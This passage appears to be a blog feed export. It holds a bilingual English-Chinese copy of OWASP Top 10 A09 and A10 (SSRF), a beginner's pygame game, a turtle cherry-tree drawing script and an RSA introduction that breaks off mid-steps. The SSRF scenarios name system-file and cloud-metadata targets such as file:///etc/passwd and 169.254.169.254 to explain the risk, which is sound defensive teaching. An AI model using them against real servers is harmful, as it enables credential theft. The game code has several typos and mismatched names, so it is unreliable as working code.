<li>The application cannot detect, escalate, or alert for active attacks in real-time or near real-time.<br>应用程序无法实时或近乎实时地检测、升级或提醒主动攻击。</li>
</ul>
<p>You are vulnerable to information leakage by making logging and alerting events visible to a user or an attacker (see <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">A01:2021-Broken Access Control</a>).<br>通过使用户或攻击者可以看到日志记录和警报事件，您很容易受到信息泄露的影响（请参阅 <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">A01：2021 - Broken Access Control</a>）。</p>
<h3 id="How-to-Prevent-8"><a href="#How-to-Prevent-8" class="headerlink" title="How to Prevent"></a>How to Prevent</h3><p>Developers should implement some or all the following controls, depending on the risk of the application:<br>开发人员应根据应用程序的风险实现以下部分或全部控制措施：</p>
<ul>
<li>Ensure all login, access control, and server-side input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts and held for enough time to allow delayed forensic analysis.<br>确保所有登录、访问控制和服务器端输入验证失败都可以使用足够的用户上下文进行记录，以识别可疑或恶意帐户，并保留足够的时间以允许延迟取证分析。</li>
<li>Ensure that logs are generated in a format that log management solutions can easily consume.<br>确保以日志管理解决方案可以轻松使用的格式生成日志。</li>
<li>Ensure log data is encoded correctly to prevent injections or attacks on the logging or monitoring systems.<br>确保对日志数据进行正确编码，以防止对日志记录或监控系统进行注入或攻击。</li>
<li>Ensure high-value transactions have an audit trail with integrity controls to prevent tampering or deletion, such as append-only database tables or similar.<br>确保高价值交易具有具有完整性控制的审计跟踪，以防止篡改或删除，例如仅附加数据库表或类似表。</li>
<li>DevSecOps teams should establish effective monitoring and alerting such that suspicious activities are detected and responded to quickly.<br>DevSecOps 团队应建立有效的监控和警报，以便快速检测并响应可疑活动。</li>
<li>Establish or adopt an incident response and recovery plan, such as National Institute of Standards and Technology (NIST) 800-61r2 or later.<br>建立或采用事件响应和恢复计划，例如美国国家标准与技术研究院 （NIST） 800-61r2 或更高版本。</li>
</ul>
<p>There are commercial and open-source application protection frameworks such as the OWASP ModSecurity Core Rule Set, and open-source log correlation software, such as the Elasticsearch, Logstash, Kibana (ELK) stack, that feature custom dashboards and alerting.<br>有商业和开源应用程序保护框架，例如 OWASP ModSecurity 核心规则集，以及开源日志关联软件，例如 Elasticsearch、Logstash、Kibana （ELK） 堆栈，它们具有自定义控制面板和警报功能。</p>
<h3 id="Example-Attack-Scenarios-8"><a href="#Example-Attack-Scenarios-8" class="headerlink" title="Example Attack Scenarios"></a>Example Attack Scenarios</h3><p><strong>Scenario #1:</strong> A children’s health plan provider’s website operator couldn’t detect a breach due to a lack of monitoring and logging. An external party informed the health plan provider that an attacker had accessed and modified thousands of sensitive health records of more than 3.5 million children. A post-incident review found that the website developers had not addressed significant vulnerabilities. As there was no logging or monitoring of the system, the data breach could have been in progress since 2013, a period of more than seven years.<br><strong>场景 #1：</strong>由于缺乏监控和日志记录，儿童健康计划提供商的网站运营商无法检测到违规行为。外部方通知健康计划提供商，攻击者访问并修改了超过 350 万儿童的数千条敏感健康记录。事后审查发现，网站开发人员没有解决重大漏洞。由于没有对系统进行日志记录或监控，数据泄露可能自 2013 年以来一直在进行，时间超过 7 年。</p>
<p><strong>Scenario #2:</strong> A major Indian airline had a data breach involving more than ten years’ worth of personal data of millions of passengers, including passport and credit card data. The data breach occurred at a third-party cloud hosting provider, who notified the airline of the breach after some time.<br><strong>场景 #2：</strong>印度一家大型航空公司发生了数据泄露事件，涉及数百万乘客十多年的个人数据，包括护照和信用卡数据。数据泄露发生在第三方云托管提供商处，该提供商在一段时间后通知了航空公司泄露事件。</p>
<p><strong>Scenario #3:</strong> A major European airline suffered a GDPR reportable breach. The breach was reportedly caused by payment application security vulnerabilities exploited by attackers, who harvested more than 400,000 customer payment records. The airline was fined 20 million pounds as a result by the privacy regulator.<br><strong>场景 #3：</strong>一家大型欧洲航空公司遭遇了 GDPR 可报告的违规行为。据报道，此次泄露是由攻击者利用的支付应用程序安全漏洞引起的，攻击者收集了超过 400,000 条客户支付记录。该航空公司因此被隐私监管机构罚款 2000 万英镑。</p>
<h2 id="A10-Server-Side-Request-Forgery-SSRF-服务器端请求伪造"><a href="#A10-Server-Side-Request-Forgery-SSRF-服务器端请求伪造" class="headerlink" title="A10 Server Side Request Forgery (SSRF)服务器端请求伪造"></a><a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/">A10 Server Side Request Forgery (SSRF)</a>服务器端请求伪造</h2><h3 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h3><p>SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).<br>每当 Web 应用程序在未验证用户提供的 URL 的情况下获取远程资源时，就会出现 SSRF 缺陷。它允许攻击者强制应用程序将构建的请求发送到意外的目的地，即使受到防火墙、VPN 或其他类型的网络访问控制列表 （ACL） 的保护。</p>
<p>As modern web applications provide end-users with convenient features, fetching a URL becomes a common scenario. As a result, the incidence of SSRF is increasing. Also, the severity of SSRF is becoming higher due to cloud services and the complexity of architectures.<br>由于现代 Web 应用程序为最终用户提供了便捷的功能，因此获取 URL 成为一种常见方案。因此，SSRF 的发病率正在增加。此外，由于云服务和架构的复杂性，SSRF 的严重性也越来越高。</p>
<h3 id="How-to-Prevent-9"><a href="#How-to-Prevent-9" class="headerlink" title="How to Prevent"></a>How to Prevent</h3><p>Developers can prevent SSRF by implementing some or all the following defense in depth controls:<br>开发者可以通过实施以下部分或全部深度防御控制措施来阻止 SSRF：</p>
<h4 id="From-Network-layer-从网络层"><a href="#From-Network-layer-从网络层" class="headerlink" title="From Network layer 从网络层"></a><strong>From Network layer 从网络层</strong></h4><ul>
<li>Segment remote resource access functionality in separate networks to reduce the impact of SSRF<br>将远程资源访问功能分段到单独的网络中，以减少 SSRF 的影响</li>
<li>Enforce “deny by default” firewall policies or network access control rules to block all but essential intranet traffic.<br>强制实施“默认拒绝”防火墙策略或网络访问 控制规则以阻止除必要的 Intranet 流量之外的所有流量。<br><em>Hints: 提示：</em><br>~ Establish an ownership and a lifecycle for firewall rules based on applications.<br>~ 根据应用程序建立防火墙规则的所有权和生命周期。<br>~ Log all accepted <em>and</em> blocked network flows on firewalls (see <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">A09:2021-Security Logging and Monitoring Failures</a>).<br>~ 记录防火墙上所有接受<em>和</em>阻止的网络流 （请参阅 <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">A09：2021 - 安全日志记录和监控故障</a>）。</li>
</ul>
<h4 id="From-Application-layer-从应用层："><a href="#From-Application-layer-从应用层：" class="headerlink" title="From Application layer: 从应用层："></a><strong>From Application layer: 从应用层：</strong></h4><ul>
<li>Sanitize and validate all client-supplied input data<br>清理和验证所有客户提供的输入数据</li>
<li>Enforce the URL schema, port, and destination with a positive allow list<br>使用肯定的 allow 列表强制实施 URL 架构、端口和目标</li>
<li>Do not send raw responses to clients<br>不向客户端发送原始响应</li>
<li>Disable HTTP redirections<br>禁用 HTTP 重定向</li>
<li>Be aware of the URL consistency to avoid attacks such as DNS rebinding and “time of check, time of use” (TOCTOU) race conditions<br>注意 URL 一致性，以避免 DNS 重新绑定和“检查时间、使用时间”（TOCTOU） 争用条件等攻击</li>
</ul>
<p>Do not mitigate SSRF via the use of a deny list or regular expression. Attackers have payload lists, tools, and skills to bypass deny lists.<br>不要通过使用拒绝列表或正则表达式来缓解 SSRF。攻击者拥有绕过拒绝列表的有效负载列表、工具和技能。</p>
<h4 id="Additional-Measures-to-consider-需要考虑的其他措施："><a href="#Additional-Measures-to-consider-需要考虑的其他措施：" class="headerlink" title="Additional Measures to consider: 需要考虑的其他措施："></a><strong>Additional Measures to consider: 需要考虑的其他措施：</strong></h4><ul>
<li>Don’t deploy other security relevant services on front systems (e.g. OpenID). Control local traffic on these systems (e.g. localhost)<br>不要在前端系统上部署其他与安全相关的服务（例如 OpenID）。控制这些系统（例如 localhost）上的本地流量</li>
<li>For frontends with dedicated and manageable user groups use network encryption (e.g. VPNs) on independent systems to consider very high protection needs<br>对于具有专用且可管理的用户组的前端，在独立系统上使用网络加密（例如 VPN），以考虑非常高的保护需求</li>
</ul>
<h3 id="Example-Attack-Scenarios-9"><a href="#Example-Attack-Scenarios-9" class="headerlink" title="Example Attack Scenarios"></a>Example Attack Scenarios</h3><p>Attackers can use SSRF to attack systems protected behind web application firewalls, firewalls, or network ACLs, using scenarios such as:<br>攻击者可以使用 SSRF 攻击受 Web 应用程序防火墙、防火墙或网络 ACL 保护的系统，使用场景如下：</p>
<p><strong>Scenario #1:</strong> Port scan internal servers – If the network architecture is unsegmented, attackers can map out internal networks and determine if ports are open or closed on internal servers from connection results or elapsed time to connect or reject SSRF payload connections.<br><strong>场景 #1：</strong>端口扫描内部服务器 – 如果网络架构未分段，攻击者可以映射出内部网络，并根据连接结果或连接或拒绝 SSRF 有效负载连接的运行时间来确定内部服务器上的端口是打开还是关闭。</p>
<p><strong>Scenario #2:</strong> Sensitive data exposure – Attackers can access local files or internal services to gain sensitive information such as <code>file:///etc/passwd</code> and <code>http://localhost:28017/</code>.<br><strong>场景 #2：</strong>敏感数据泄露 – 攻击者可以访问本地文件或内部服务以获取敏感信息，例如 <code>file:///etc/passwd</code> 和 <code>http://localhost:28017/</code>。</p>
<p><strong>Scenario #3:</strong> Access metadata storage of cloud services – Most cloud providers have metadata storage such as <code>http://169.254.169.254/</code>. An attacker can read the metadata to gain sensitive information.<br><strong>场景 #3：</strong>访问云服务的元数据存储 – 大多数云提供商都有元数据存储，例如 <code>http://169.254.169.254/</code>。攻击者可以读取元数据以获取敏感信息。</p>
<p><strong>Scenario #4:</strong> Compromise internal services – The attacker can abuse internal services to conduct further attacks such as Remote Code Execution (RCE) or Denial of Service (DoS).<br><strong>场景 #4：</strong>危害内部服务 – 攻击者可以滥用内部服务进行进一步的攻击，例如远程代码执行 （RCE） 或拒绝服务 （DoS）。</p>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>security</tag>
        <tag>OWASP</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实战</title>
    <url>/2024/02/07/Python%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="外星人入侵游戏开发"><a href="#外星人入侵游戏开发" class="headerlink" title="外星人入侵游戏开发"></a>外星人入侵游戏开发</h2><p>一、开发框架</p>
<p>总文件：alien_invasion</p>
<p>包含文件：</p>
<ul>
<li>image文件</li>
<li>alien_invasion.py</li>
<li>game_functions.py</li>
<li>ship.py</li>
<li>settings.py</li>
<li>bullet.py</li>
</ul>
<hr>
<p><strong>alien.invasion.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien_invasion.py</span></span><br><span class="line"><span class="comment">#一系列整个游戏都要用到的对象,游戏的主循环</span></span><br><span class="line"><span class="keyword">import</span> pygame<span class="comment">#模块pygame包含开发游戏所需的功能</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> settings <span class="keyword">import</span> Settings</span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"><span class="keyword">import</span> game_functions <span class="keyword">as</span> gf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_game</span>():</span><br><span class="line">    <span class="comment">#初始化游戏并创建一个屏幕对象</span></span><br><span class="line">    pygame.init()<span class="comment">#初始化背景设置</span></span><br><span class="line">    ai_settings = Settings()</span><br><span class="line">    screen = pygame.display.set_mode((ai_settings.screen_width,ai_settings.screen_height))</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    我们调用pygame.display.set_mode()来创建一个名为screen的显示窗口，这个游戏的所有图形元素都将在其中绘制。</span></span><br><span class="line"><span class="string">    通过将这些尺寸值传递给pygame.display.set_mode()，我们创建了一个宽1200像素、高800像素的游戏窗口</span></span><br><span class="line"><span class="string">    （你可以根据自己的显示器尺寸调整这些值）。</span></span><br><span class="line"><span class="string">    surface是屏幕的一部分，用于显示游戏元素。在这个游戏中，每个元素（如外星人或飞船）都是一个surface。</span></span><br><span class="line"><span class="string">    display.set_mode()返回的surface表示整个游戏窗口。</span></span><br><span class="line"><span class="string">    我们激活游戏的动画循环后，每经过一次循环都将自动重绘这个surface。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pygame.display.set_caption(<span class="string">&quot;Alien Invasion&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#设置背景色</span></span><br><span class="line">    bg_color = (<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#创建一艘飞船</span></span><br><span class="line">    ship = Ship(ai_settings,screen)<span class="comment">#创建一个名为ship的Ship实例</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#开始游戏的主循环</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        gf.check_events(ship)</span><br><span class="line">        gf.ship.updat()<span class="comment">#玩家输入时，飞船位置更新</span></span><br><span class="line">        gf.update_screen(ai_settings,screen,ship)</span><br><span class="line"></span><br><span class="line">run_game()</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>game_functions.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#game_functions.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;包含一系列函数，由它完成游戏的大部分工作.</span></span><br><span class="line"><span class="string">check_events()检测相关事件，按键的按下与松开，并且辅助check_keydown_events()和check_keyup_events()处理事件</span></span><br><span class="line"><span class="string">包含模块update_screen()用于每次执行主循环时的屏幕绘制</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_keydown_events</span>(<span class="params">event,ship</span>):<span class="comment">#检查鼠标键按下</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> event.key == pygame.K_RITGHT:</span><br><span class="line">        ship.moving_right = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">        ship.moving_left = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_keyup_events</span>(<span class="params">event,ship</span>):<span class="comment">#检查鼠标键松开</span></span><br><span class="line">    <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">        ship.moving_right = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> event.key ==pygame.K_LEFT:</span><br><span class="line">        ship.moving_left = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_events</span>(<span class="params">event,ship</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键和鼠标事件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> events <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="keyword">if</span> events.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> events.<span class="built_in">type</span> == pygame.KEYDOWN:<span class="comment">#鼠标键按下时</span></span><br><span class="line">            check_keydown_events(event,ship)</span><br><span class="line">        <span class="keyword">elif</span> events.<span class="built_in">type</span> ==pygame.KEYUP:<span class="comment">#鼠标键松开时</span></span><br><span class="line">            check_keyup_events(event,ship)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_screen</span>(<span class="params">ai_settings,screen,ship</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;更新屏幕上的图像，并切换到新屏幕&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 每次循环都重新绘制屏幕</span></span><br><span class="line">    screen.fill(ai_settings.bg_color)  <span class="comment"># 这个方法只接受一个实参：一种颜色。</span></span><br><span class="line">    ship.blitme()  <span class="comment"># 将飞船绘制到屏幕</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 让最近绘制的屏幕可见</span></span><br><span class="line">    pygame.display.flip()  <span class="comment"># 命令Pygame让最近绘制的屏幕可见。营造平滑移动的效果。</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p><strong>ship.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Ship.py</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;包含__init__()、管理飞船位置的方法update()以及在屏幕上绘制飞船的方法blitme()&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ship</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,ai_settings,screen</span>):<span class="comment">#screen指定了要将飞船绘制到什么地方</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化飞船并设置其初始位置&quot;&quot;&quot;</span></span><br><span class="line">        self.screen = screen</span><br><span class="line">        self.ai_settings = ai_settings</span><br><span class="line">        <span class="comment">#加载飞船图像并获取其外接矩形</span></span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;.\images\ship.bmp&#x27;</span>)</span><br><span class="line">        self.rect = self.image.get_rect()<span class="comment">#飞船图像</span></span><br><span class="line">        self.screen_rect = screen.get_rect()<span class="comment">#屏幕</span></span><br><span class="line">        <span class="comment">#将每艘新飞船放在屏幕底部中央</span></span><br><span class="line">        self.rect.centerx = self.screen_rect.centerx<span class="comment">#self.rect.centerx（飞船中心的x坐标）</span></span><br><span class="line">        self.rect.bottom = self.screen_rect.bottom<span class="comment">#self.rect.bottom（飞船下边缘的y坐标）</span></span><br><span class="line">        <span class="comment">#在飞船的属性center中存储小数值</span></span><br><span class="line">        self.center = <span class="built_in">float</span>(self.rect.centerx)</span><br><span class="line">        <span class="comment">#移动标志</span></span><br><span class="line">        self.moving_right = <span class="literal">False</span>  <span class="comment">#向右移动标志</span></span><br><span class="line">        self.mobing_left = <span class="literal">False</span> <span class="comment">#向左移动标志</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">updat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;根据移动标志调整飞船的位置&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#更新飞船的center值，而不是rect</span></span><br><span class="line">        <span class="comment">#self.rect.right返回飞船外接矩形的右边缘的x坐标，如果这个值小于self.screen_rect.right的值，就说明飞船未触及屏幕右边缘</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_right <span class="keyword">and</span> self.rect.right &lt; self.screen_rect.right:</span><br><span class="line">            self.rect.centerx += self.ai_settings.ship_speed_factor</span><br><span class="line">        <span class="comment">#如果rect的左边缘的x坐标大于零，就说明飞船未触及屏幕左边缘</span></span><br><span class="line">        <span class="keyword">if</span> self.moving_left <span class="keyword">and</span> self.rect.left &gt; <span class="number">0</span>:</span><br><span class="line">            self.rect.centerx -= self.ai_settings.ship_speed_factor</span><br><span class="line">        <span class="comment">#根据self.rect.center更新rect对象</span></span><br><span class="line">        self.rect.centerx = self.center</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">blitme</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在指定位置绘制飞船&quot;&quot;&quot;</span></span><br><span class="line">        self.screen.blit(self.image,self.rect)</span><br></pre></td></tr></table></figure>

<hr>
<p>settings.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setting.py</span></span><br><span class="line"><span class="comment">#包含Setting类，只含有__init__()，初始化控制游戏外观和飞船的速度属性,射击子弹的属性</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Settings</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;存储《外星入侵》的所有设置的类&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#初始化游戏的设置</span></span><br><span class="line">        <span class="comment">#屏幕设置</span></span><br><span class="line">        self.screen_width = <span class="number">1200</span></span><br><span class="line">        self.screen_height = <span class="number">800</span></span><br><span class="line">        self.bg_color = (<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)<span class="comment">#灰色</span></span><br><span class="line">        <span class="comment">#飞船的设置</span></span><br><span class="line">        self.ship_speed_factor = <span class="number">1.5</span></span><br><span class="line">        <span class="comment">#设置子弹</span></span><br><span class="line">        self.bullet_speed_factor = <span class="number">1</span></span><br><span class="line">        self.bullet_width = <span class="number">3</span></span><br><span class="line">        self.bullet_hight = <span class="number">15</span></span><br><span class="line">        self.bullet_color = <span class="number">60</span>,<span class="number">60</span>,<span class="number">60</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p><strong>bullet.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bullet.py</span></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Sprite<span class="comment">#精灵，可将游戏中相关的元素编组，进而同时操作编组中的所有元素。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bullet</span>(<span class="title class_ inherited__">Sprite</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一个对飞船发射的子弹进行管理的类&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ai_settings, screen,ship</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在飞船所处的位置创建一个子弹对象&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>(Bullet,self)._init__()</span><br><span class="line">        self.screen = screen</span><br><span class="line"></span><br><span class="line">        <span class="comment">#在(0,0)处创建一个表示子弹的矩形，在设置正确的位置</span></span><br><span class="line">        self.rect = pygame.Rect(<span class="number">0</span>,<span class="number">0</span>,ai_settings.bullet_width,ai_settings.bullet_height)</span><br><span class="line">        self.rect.centerx = ship.rect.centerx</span><br><span class="line">        self.rect.top = ship.rect.top</span><br><span class="line"></span><br><span class="line">        <span class="comment">#存储用小数表示的位置</span></span><br><span class="line">        self.y = <span class="built_in">float</span>(self.rect.y)</span><br><span class="line">        self.color  = ai_settings.bullet_color</span><br><span class="line">        self.speed_factor  = ai_settings.bullet_speed_factor</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;向上移动子弹&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#更新表示子弹的位置的小数值</span></span><br><span class="line">        self.y -= self.speed_factor</span><br><span class="line">        <span class="comment">#更新表示子弹的rect位置</span></span><br><span class="line">        self.rect.y = self.y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">draw_bullet</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在屏幕上绘制子弹&quot;&quot;&quot;</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;函数draw.rect()使用存储在self.color中的颜色填充表示子弹的rect占据的屏幕部分&quot;&quot;&quot;</span></span><br><span class="line">        pygame.draw.rect(self.screen,self.color,self.rect)</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>images文件</strong></p>
<ul>
<li><img src="https://gitee.com/kingwempity/images/raw/master/images/ship.bmp" alt="ship"></li>
</ul>
<hr>
<p>项目进度：12.6.4</p>
<p>敬请T期待</p>
<h2 id="樱花树"><a href="#樱花树" class="headerlink" title="樱花树"></a>樱花树</h2><blockquote>
<p>原文链接：<a href="https://blog.csdn.net/sxc1414749109/article/details/139392284">https://blog.csdn.net/sxc1414749109/article/details/139392284</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cherry.py</span><br><span class="line">from turtle import *</span><br><span class="line">from random import random</span><br><span class="line">from math import cos,radians</span><br><span class="line"></span><br><span class="line">def draw_tree(branch_length,level):</span><br><span class="line">    #递归绘制树干</span><br><span class="line">    pendown()</span><br><span class="line">    #根据当前的方向和角度改变颜色</span><br><span class="line">    t=cos(radians(heading()+45))/8+0.25</span><br><span class="line">    pencolor(t,t,t)</span><br><span class="line">    pensize(branch_length/10)</span><br><span class="line">    forward(branch_length)</span><br><span class="line"></span><br><span class="line">    if level &gt; 0 :#如果还有分支级别</span><br><span class="line">        #随意生成分支角度和长度</span><br><span class="line">        angle1=random()*15+10</span><br><span class="line">        angle2=random()*15+10</span><br><span class="line">        new_length=branch_length*(random()*0.25+0.7)</span><br><span class="line"></span><br><span class="line">        #绘制右侧分支</span><br><span class="line">        right(angle1)</span><br><span class="line">        draw_tree(new_length,level-1)</span><br><span class="line"></span><br><span class="line">        #绘制左侧分支</span><br><span class="line">        left(angle1+angle2)</span><br><span class="line">        draw_tree(new_length,level-1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        right(angle2)</span><br><span class="line">    else: # 如果已经到达最底层</span><br><span class="line">        # 在分支末端绘制花朵</span><br><span class="line">        draw_flower()</span><br><span class="line"></span><br><span class="line">    penup()</span><br><span class="line">    backward(branch_length)</span><br><span class="line"></span><br><span class="line">#绘制树枝末端树叶</span><br><span class="line">def draw_flower():</span><br><span class="line"></span><br><span class="line">    right(90)#调整方向，准备绘制花朵</span><br><span class="line">    pencolor(&quot;pink&quot;)</span><br><span class="line">    circle(3)#绘制花朵</span><br><span class="line"></span><br><span class="line">    left(90)#调整方向，准备绘制其他元素</span><br><span class="line"></span><br><span class="line">    #偶尔在地面上绘制落花</span><br><span class="line">    if random() &gt; 0.7:</span><br><span class="line">        penup()#抬笔，停止绘画</span><br><span class="line">        current_heading=heading()#记录当前方向</span><br><span class="line">        angle = -40+random()*80</span><br><span class="line">        setheading(angle)#设置方向</span><br><span class="line">        #计算落花的距离</span><br><span class="line">        distance=int(800 * random() * 0.5 + 400 * random() * 0.3 + 200 * random() * 0.2)</span><br><span class="line">        forward(distance)</span><br><span class="line">        #落笔</span><br><span class="line">        pendown()</span><br><span class="line">        right(90)</span><br><span class="line">        #根据当前的方向和角度计算颜色</span><br><span class="line">        n=cos(radians(heading()-45))/4+0.5</span><br><span class="line">        pencolor(n*0.5+0.5, 0.4+n*0.4, 0.4+n*0.4)</span><br><span class="line">        circle(2)</span><br><span class="line"></span><br><span class="line">        left(90)</span><br><span class="line">        penup()</span><br><span class="line">        setheading(angle)</span><br><span class="line">        backward(distance)#后退回原来的位置</span><br><span class="line">        setheading(current_heading)#恢复至原始方向</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    &quot;&quot;&quot;主函数用于设置绘图环境并开始绘制过程&quot;&quot;&quot;</span><br><span class="line">    bgcolor(0.956, 0.9255, 0.9882)  # 设置背景颜色为浅紫色</span><br><span class="line">    speed(10)</span><br><span class="line">    hideturtle()</span><br><span class="line">    tracer(100)#设置追踪延迟</span><br><span class="line"></span><br><span class="line">    penup()#抬笔</span><br><span class="line">    backward(100)#后退一段距离</span><br><span class="line">    left(90)</span><br><span class="line">    backward(300)</span><br><span class="line"></span><br><span class="line">    draw_tree(100, 12)</span><br><span class="line">    done()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() #主函数</span><br></pre></td></tr></table></figure>

<p>效果图：</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/cherry.png" alt="cherry"></p>
]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>实战项目</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA</title>
    <url>/2024/09/15/RSA/</url>
    <content><![CDATA[<mate name="referrer" content="no-referrer"></mate>

<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><h2 id="一-简介"><a href="#一-简介" class="headerlink" title="(一)简介"></a>(一)简介</h2><p>​		RSA 算法是<strong>非对称算法</strong>，由 Ronald Rivest 、 Adi Shamir 、 Leonard Adleman 三 人共同在 1977年公开发表。在 RSA 加密算法中，<strong>公钥和私钥都可以用于加密消息，用于加密消息的密钥与用于解密消息的密钥相反</strong>。 RSA 算法提供了一种保护网络通信和数据存储的<strong>机密性、完整性、真实性和不可否认性</strong>的方法。</p>
<p>​		目前， SSH 、 OpenPGP 、 S/MIME 和 SSL/TLS 都依赖千 RSA 进行加密和数字签名功能。 RSA 算法在浏览器中使用，能够在不可信任的互联网中建立安全连接。<strong>RSA 签名验证是网络连接系统中最常见的执行操作之一。</strong></p>
<blockquote>
<p>RSA 算法基于<strong>大整数因子分解</strong>的困难性，该算法的步骤如下：</p>
<p>第 一 步，生成两个大素数 p  和  q。</p>
<p>第 二 步，计算这两个素数的乘积 n = p q 。</p>
<p>第三步，计算小于 n 并且与 n 互素的整数的个数，即欧拉函数 ɸ ( 𝓷 )  =  ( p - 1 ) ( q - 1 )  。</p>
<p>第四步，选取 一 个随机数 e ，且满足  1 &lt; e &lt; ɸ ( 𝓷 ) ,并且 e 和 ɸ ( 𝓷 ) 互素，即 gad( e , ɸ ( 𝓷 ) ) = 1. </p>
